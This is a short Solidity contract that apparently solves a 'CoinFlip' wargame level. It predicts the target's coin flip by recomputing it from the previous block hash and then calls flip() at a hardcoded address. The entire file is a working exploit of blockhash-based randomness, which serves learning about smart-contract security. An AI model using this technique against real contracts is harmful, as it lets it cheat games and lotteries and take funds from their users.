pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlip {
    ICoinFlip cf = ICoinFlip(0xB9DADFc8B6396DbeBFD33642f7300Ecd8C3f7e22);
    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function guess() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 outcome = blockValue / factor;
        bool side = outcome == 1 ? true : false;
        cf.flip(side);
    }
}